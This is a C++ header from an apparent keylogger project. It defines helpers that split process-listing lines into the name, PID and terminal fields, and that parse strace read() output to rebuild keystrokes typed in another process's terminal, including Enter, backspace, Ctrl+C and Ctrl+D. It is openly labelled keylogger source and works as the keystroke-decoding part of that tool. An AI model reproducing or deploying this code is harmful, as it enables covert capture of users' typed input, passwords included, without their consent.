#ifndef KEYLOGGER_PARSING_HPP
#define KEYLOGGER_PARSING_HPP

namespace parsing_utils {
    void split_string(const std::string &s, char delim, std::vector<std::string> &elems) {
        std::stringstream ss(s);
        std::string item;
        while (std::getline(ss, item, delim)) {
            if (item.length() > 0) {
                elems.push_back(item);
            }
        }
    }

    std::tuple<std::string, uint16_t, std::string, std::string> split_proc_info(const std::string& proc_info){
        std::vector<std::string> elems{};
        char delim = ' ';
        split_string(proc_info, delim, elems);
        std::tuple<std::string, uint16_t, std::string, std::string> splitted_proc_info = std::make_tuple(elems[0],
                                                                                                         std::stoi(elems[1]), elems[10], elems[11]);
        return splitted_proc_info;
    }

    std::string parse_strace_output(std::string& output, boost::regex& xRegEx){
        boost::smatch xResults{};
        boost::regex_search(output, xResults, xRegEx);
        if(!xResults.empty()){
            std::cout << "FOUND_ALL: " << xResults[0] << std::endl;
            std::cout << "FOUND_CMD: " << xResults["cmd"] << std::endl;
            if(xResults["cmd"] == "\\r") return "\n";
            else if(xResults["cmd"] == "\\177") return "\b";
            else if(xResults["cmd"] == "\\3") return "[Ctrl+C]^C\n";
            else if(xResults["cmd"] == "\\4") return "[Ctrl+D]^D\n";
            else return xResults["cmd"];
        }
        std::cout << "CMD: EMPTY" << std::endl;
        return "EMPTY";
    }
}

#endif //KEYLOGGER_PARSING_HPP
